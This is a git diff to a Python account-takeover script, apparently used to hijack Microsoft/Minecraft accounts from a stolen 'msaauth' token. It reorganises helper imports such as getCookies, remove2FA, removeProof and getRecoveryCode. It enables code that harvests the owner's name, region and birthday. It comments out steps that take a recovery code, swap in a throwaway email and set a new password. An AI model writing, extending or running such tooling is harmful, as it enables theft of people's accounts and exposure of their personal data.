@@ -1,21 +1,21 @@
-from views.utils.securityInformation import securityInformation
-from views.utils.recoveryCodeSecure import recoveryCodeSecure
-from views.utils.getRecoveryCode import getRecoveryCode
-from views.utils.getAccountInfo import getAccountInfo
-from views.utils.removeServices import removeServices
-from views.utils.generateEmail import generateEmail
-from views.utils.removeProof import removeProof
-from views.utils.getCookies import getCookies
-from views.utils.polishHost import polishHost
-from views.utils.getProfile import getProfile
-from views.utils.removeZyger import removeZyger
-from views.utils.remove2FA import remove2FA
-from views.utils.getMethod import getMethod
-from views.utils.getCapes import getCapes
-from views.utils.getAMRP import getAMRP
-from views.utils.getSSID import getSSID
-from views.utils.getXBL import getXBL
-from views.utils.getT import getT
+from views.utils.securing.securityInformation import securityInformation
+from views.utils.securing.recoveryCodeSecure import recoveryCodeSecure
+from views.utils.securing.getRecoveryCode import getRecoveryCode
+from views.utils.securing.getAccountInfo import getAccountInfo
+from views.utils.securing.removeServices import removeServices
+from views.utils.securing.generateEmail import generateEmail
+from views.utils.securing.removeProof import removeProof
+from views.utils.securing.getCookies import getCookies
+from views.utils.securing.polishHost import polishHost
+from views.utils.securing.getProfile import getProfile
+from views.utils.securing.removeZyger import removeZyger
+from views.utils.securing.remove2FA import remove2FA
+from views.utils.minecraft.getMethod import getMethod
+from views.utils.minecraft.getCapes import getCapes
+from views.utils.securing.getAMRP import getAMRP
+from views.utils.securing.getSSID import getSSID
+from views.utils.securing.getXBL import getXBL
+from views.utils.securing.getT import getT
 import secrets
 import json
 
@@ -150,49 +150,49 @@ def secure(msaauth: str):
             #                                                       #
             #########################################################
 
-            # accountMSInfo = getAccountInfo(amrp, cookies[2])
+            accountMSInfo = getAccountInfo(amrp, cookies[2])
 
-        #     accountInfo["firstName"] = accountMSInfo["firstName"]
-        #     accountInfo["lastName"] = accountMSInfo["lastName"]
-        #     accountInfo["fullName"] = accountMSInfo["fullName"]
-        #     accountInfo["region"] = accountMSInfo["region"]
-        #     accountInfo["birthday"] = accountMSInfo["birthday"]
-        #     print("[+] -  Got Account Information")
+            accountInfo["firstName"] = accountMSInfo["firstName"]
+            accountInfo["lastName"] = accountMSInfo["lastName"]
+            accountInfo["fullName"] = accountMSInfo["fullName"]
+            accountInfo["region"] = accountMSInfo["region"]
+            accountInfo["birthday"] = accountMSInfo["birthday"]
+            print("[+] -  Got Account Information")
 
-            securityParameters = json.loads(securityInformation(amrp))
-            print("[+] - Got Security Parameters")
+            # securityParameters = json.loads(securityInformation(amrp))
+            # print("[+] - Got Security Parameters")
 
-            if securityParameters:
+            # if securityParameters:
 
-                email = securityParameters["email"]
-                encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"] 
+            #     email = securityParameters["email"]
+            #     encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"] 
 
-                accountInfo["oldEmail"] = email
+            #     accountInfo["oldEmail"] = email
                 
-                recoveryCode = getRecoveryCode(
-                    amrp,
-                    cookies[1],
-                    cookies[2],
-                    encryptedNetID
-                )
-                print("[+] - Got Recovery Code")
+            #     recoveryCode = getRecoveryCode(
+            #         amrp,
+            #         cookies[1],
+            #         cookies[2],
+            #         encryptedNetID
+            #     )
+            #     print("[+] - Got Recovery Code")
 
-                new_email = generateEmail(mailslurp_key)
-                print(f"[+] - Generated Email ({new_email})")
+            #     new_email = generateEmail(mailslurp_key)
+            #     print(f"[+] - Generated Email ({new_email})")
 
-                new_password = secrets.token_urlsafe(13)
-                print(f"[+] - Generated Password ({new_password})")
+            #     new_password = secrets.token_urlsafe(13)
+            #     print(f"[+] - Generated Password ({new_password})")
 
-                print("[~] - Automaticly Securing Account...")
-                newData = recoveryCodeSecure(email, recoveryCode, new_email, new_password, mailslurp_key) 
+            #     print("[~] - Automaticly Securing Account...")
+            #     newData = recoveryCodeSecure(email, recoveryCode, new_email, new_password, mailslurp_key) 
                 
-                if newData:
+            #     if newData:
                     
-                    accountInfo["secEmail"] = new_email
-                    accountInfo["recoveryCode"] = newData[0]
-                    accountInfo["password"] = newData[1]
+            #         accountInfo["secEmail"] = new_email
+            #         accountInfo["recoveryCode"] = newData[0]
+            #         accountInfo["password"] = newData[1]
 
-                print("[+] - Account has been secured")
+            #     print("[+] - Account has been secured")
 
     return accountInfo
 
